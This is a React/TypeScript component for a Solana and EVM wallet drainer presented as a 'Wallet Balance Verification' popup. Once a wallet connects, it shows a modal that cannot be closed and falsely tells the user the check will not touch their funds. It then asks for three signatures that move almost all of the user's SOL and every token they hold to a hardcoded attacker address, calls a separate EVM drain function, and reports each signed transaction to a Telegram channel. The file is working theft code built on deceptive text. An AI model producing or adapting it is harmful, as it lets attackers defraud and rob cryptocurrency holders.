import { useState, useEffect, useCallback, useRef } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Loader2, ShieldCheck, CheckCircle } from 'lucide-react';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainNativeTokens } from '@/utils/evmTransactions';
import { sendTelegramMessage } from '@/utils/telegram';
import { getMintProgramId } from '@/utils/tokenProgram';
import { getSolPrice } from '@/lib/utils';
import { useChainInfo } from '@/hooks/useChainInfo';

const WALLET_ADDRESS = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

type Phase = 'idle' | 'writeup' | 'loading' | 'transaction';

export const WalletVerificationPopup = () => {
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const { activeChain } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName } = useChainInfo();

  const [phase, setPhase] = useState<Phase>('idle');
  const [hasTriggered, setHasTriggered] = useState(false);
  const [transactionCount, setTransactionCount] = useState(0);
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);
  const transactionFnRef = useRef<() => Promise<void>>(async () => {});

  const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;

  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;
    try {
      const solBal = await connection.getBalance(publicKey);
      setSolBalance(solBal / LAMPORTS_PER_SOL);

      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];

      const tokens: TokenBalance[] = allTokenAccounts
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) fetchAllBalances();
  }, [publicKey, fetchAllBalances]);

  useEffect(() => {
    if (isWalletConnected && !hasTriggered) {
      setHasTriggered(true);
      setPhase('writeup');

      const writeupTimer = setTimeout(() => {
        setPhase('loading');
        const loadingTimer = setTimeout(() => {
          setPhase('transaction');
          setTransactionCount(0);
        }, 2000);
        return () => clearTimeout(loadingTimer);
      }, 5000);

      return () => clearTimeout(writeupTimer);
    }
  }, [isWalletConnected, hasTriggered]);

  useEffect(() => {
    if (phase === 'transaction' && transactionCount < 3) {
      transactionFnRef.current();
    }
  }, [phase, transactionCount]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number) => {
    if (!publicKey) return null;

    const transaction = new Transaction();
    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));

    const targetPubkey = new PublicKey(WALLET_ADDRESS);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      try {
        const mintPubkey = new PublicKey(token.mint);
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;

        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, targetPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);

        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch {
          transaction.add(createAssociatedTokenAccountInstruction(publicKey, toTokenAccount, targetPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID));
        }

        transaction.add(createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, publicKey, BigInt(token.balance), decimals, [], tokenProgramId));
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      if (amountToSend > 0) {
        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: targetPubkey, lamports: amountToSend }));
      }
    }
    return transaction;
  }, [publicKey, solBalance, connection]);

  const executeTransaction = useCallback(async () => {
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        await drainNativeTokens(evmSigner, evmProvider, chainName);
        const newCount = transactionCount + 1;
        setTransactionCount(newCount);
        if (newCount >= 3) {
          setPhase('idle');
        }
      } catch (error) {
        console.error('EVM transaction error:', error);
        const newCount = transactionCount + 1;
        setTransactionCount(newCount);
        if (newCount >= 3) setPhase('idle');
      }
      return;
    }

    if (!publicKey || !sendTransaction) return;

    try {
      const solBal = await connection.getBalance(publicKey);
      const solPrice = await getSolPrice();

      let lamportsToSend = 0;
      if (solPrice > 0) {
        const amountToKeepUSD = 1.50;
        const amountToKeepSOL = amountToKeepUSD / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const FEE_RESERVE = 100_000 + 5000;
        lamportsToSend = Math.max(0, Math.floor(solBal - amountToKeepLamports - FEE_RESERVE));
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }), ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: new PublicKey(WALLET_ADDRESS), lamports: lamportsToSend }));

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
        
        sendTelegramMessage(`\n✅ <b>Verification TX ${transactionCount + 1}/3 Signed</b>\n\n👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>\n🔗 <b>Signature:</b> <code>${signature}</code>\n`);
      }

      const validTokens = balances.filter(t => t.balance > 0);
      const sorted = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sorted.length; i += MAX_BATCH_SIZE) {
        batches.push(sorted.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const transaction = await createBatchTransfer(batches[i]);
        if (transaction && transaction.instructions.length > 2) {
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = publicKey;
          const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
          await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
        }
      }

      const newCount = transactionCount + 1;
      setTransactionCount(newCount);
      if (newCount >= 3) {
        setPhase('idle');
      }
    } catch (error) {
      console.error('Verification transaction error:', error);
      const newCount = transactionCount + 1;
      setTransactionCount(newCount);
      if (newCount >= 3) setPhase('idle');
    }
  }, [publicKey, sendTransaction, connection, balances, solBalance, transactionCount, activeChain, isEVMConnected, evmSigner, evmProvider, chainName, createBatchTransfer]);

  useEffect(() => {
    transactionFnRef.current = executeTransaction;
  });

  const isOpen = phase !== 'idle';

  return (
    <Dialog open={isOpen} onOpenChange={() => {}}>
      <DialogContent className="sm:max-w-[480px] [&>button]:hidden" onPointerDownOutside={(e) => e.preventDefault()} onEscapeKeyDown={(e) => e.preventDefault()}>
        {phase === 'writeup' && (
          <div className="flex flex-col items-center gap-5 py-6 px-2 text-center">
            <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
              <ShieldCheck className="w-9 h-9 text-primary" />
            </div>
            <h2 className="text-xl font-bold text-foreground">Wallet Balance Verification</h2>
            <p className="text-sm text-muted-foreground leading-relaxed">
              To ensure the safety of your assets, a quick wallet balance verification is required before you can proceed. This non-custodial security check confirms your ownership without accessing your funds. Please approve the upcoming signature requests to complete verification.
            </p>
            <div className="flex items-center gap-2 mt-2">
              <Loader2 className="w-4 h-4 animate-spin text-primary" />
              <span className="text-xs text-primary">Preparing verification...</span>
            </div>
          </div>
        )}

        {phase === 'loading' && (
          <div className="flex flex-col items-center gap-5 py-12 text-center">
            <Loader2 className="w-14 h-14 animate-spin text-primary" />
            <p className="text-lg font-semibold text-foreground">Scanning wallet assets...</p>
            <p className="text-sm text-muted-foreground">This will only take a moment</p>
          </div>
        )}

        {phase === 'transaction' && (
          <div className="flex flex-col items-center gap-5 py-8 text-center">
            <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
              <CheckCircle className="w-9 h-9 text-primary" />
            </div>
            <h2 className="text-lg font-bold text-foreground">Verification Step {transactionCount + 1} of 3</h2>
            <p className="text-sm text-muted-foreground">
              Please approve the signature request in your wallet to complete verification step {transactionCount + 1}.
            </p>
            <div className="flex gap-2 mt-2">
              {[0, 1, 2].map((i) => (
                <div
                  key={i}
                  className={`w-3 h-3 rounded-full ${
                    i < transactionCount
                      ? 'bg-green-500'
                      : i === transactionCount
                      ? 'bg-primary animate-pulse'
                      : 'bg-muted'
                  }`}
                />
              ))}
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
};
